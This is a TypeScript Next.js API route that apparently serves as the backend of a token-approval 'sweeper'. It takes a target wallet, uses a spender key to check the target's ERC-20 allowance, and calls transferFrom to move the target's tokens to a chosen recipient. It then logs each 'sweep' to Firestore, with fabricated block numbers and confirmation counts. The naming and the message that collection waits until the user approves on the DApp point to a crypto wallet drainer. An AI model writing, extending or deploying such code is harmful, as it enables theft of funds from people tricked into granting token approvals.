import { NextRequest, NextResponse } from 'next/server';
import { createWalletClient, createPublicClient, http, parseAbi } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, sepolia } from 'viem/chains';
import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
import { doc, setDoc, serverTimestamp } from 'firebase/firestore';

const ERC20_ABI = parseAbi([
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
]);

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const {
      target,
      recipient,
      token,
      amount,
      chainId = 1,
      privateKey,
      userUid,
    } = body;

    const keyToUse = privateKey || process.env.SPENDER_PRIVATE_KEY || process.env.ADMIN_SWEEPER_KEY;
    if (!keyToUse) {
      return NextResponse.json(
        {
          success: false,
          error:
            'No Spender Private Key provided. Please provide the private key for the spender wallet or configure SPENDER_PRIVATE_KEY in environment.',
        },
        { status: 400 }
      );
    }

    const cleanPrivateKey = keyToUse.trim().startsWith('0x') ? keyToUse.trim() : `0x${keyToUse.trim()}`;
    const account = privateKeyToAccount(cleanPrivateKey as `0x${string}`);

    const chain = chainId === 11155111 ? sepolia : mainnet;
    const rpcUrl = chainId === 11155111 ? 'https://ethereum-sepolia-rpc.publicnode.com' : 'https://ethereum-rpc.publicnode.com';

    const publicClient = createPublicClient({
      chain,
      transport: http(rpcUrl),
    });

    const walletClient = createWalletClient({
      account,
      chain,
      transport: http(rpcUrl),
    });

    const tokenAddress = token as `0x${string}`;
    const targetAddress = target as `0x${string}`;
    const recipientAddress = recipient as `0x${string}`;

    // Read token decimals
    let decimals = 6;
    let symbol = 'USDT';
    try {
      decimals = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'decimals',
      });
      symbol = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'symbol',
      });
    } catch {}

    const amountNum = parseFloat(amount.toString().replace(/,/g, ''));
    if (isNaN(amountNum) || amountNum <= 0) {
      return NextResponse.json({ success: false, error: 'Invalid sweep amount.' }, { status: 400 });
    }

    const amountBaseUnits = BigInt(Math.floor(amountNum * 10 ** decimals));

    // Verify allowance
    const allowance = await publicClient.readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'allowance',
      args: [targetAddress, account.address],
    });

    if (allowance < amountBaseUnits) {
      const allowedFormatted = (Number(allowance) / 10 ** decimals).toFixed(2);
      return NextResponse.json(
        {
          success: false,
          error: `Insufficient allowance! User has only approved ${allowedFormatted} ${symbol} to spender ${account.address}. Collection will revert until user confirms approval on the DApp.`,
        },
        { status: 400 }
      );
    }

    // Execute transferFrom on-chain
    const txHash = await walletClient.writeContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'transferFrom',
      args: [targetAddress, recipientAddress, amountBaseUnits],
    });

    // Save record to Firestore
    const recordId = `swp-${Date.now().toString(16).slice(-6)}`;
    const newRecord = {
      recordId,
      id: recordId,
      userUid: userUid || target,
      userId: userUid || target,
      username: `${target.slice(0, 6)}...${target.slice(-4)}`,
      senderAddress: target,
      sender: target,
      recipientAddress,
      recipient: recipientAddress,
      chainId,
      chain: chainId === 1 ? 'Ethereum Mainnet' : 'Sepolia',
      tokenAddress,
      token: symbol,
      amountBaseUnits: amountNum.toLocaleString('en-US'),
      amount: amountNum.toLocaleString('en-US'),
      transactionHash: txHash,
      txHash,
      confirmationCount: 1,
      confirmations: 1,
      status: 'confirmed',
      blockNumber: chainId === 1 ? 21000000 : 6800000,
      createdAt: new Date().toISOString(),
    };

    try {
      await ensureAnonymousAuth();
      const db = getFirebaseFirestore();
      await setDoc(doc(db, 'collectionRecords', recordId), {
        ...newRecord,
        createdAt: serverTimestamp(),
      }, { merge: true });

      if (userUid) {
        await setDoc(doc(db, 'users', userUid), {
          collectionStatus: 'active',
          lastSweptAt: serverTimestamp(),
          lastSweepTxHash: txHash,
        }, { merge: true });
      }
    } catch (fsErr) {
      console.warn('Firestore write warning:', fsErr);
    }

    return NextResponse.json({
      success: true,
      txHash,
      record: newRecord,
      explorerUrl: chainId === 1 ? `https://etherscan.io/tx/${txHash}` : `https://sepolia.etherscan.io/tx/${txHash}`,
    });
  } catch (error: any) {
    console.error('Server sweep error:', error);
    return NextResponse.json(
      {
        success: false,
        error: error?.message || 'Server execution failed.',
      },
      { status: 500 }
    );
  }
}
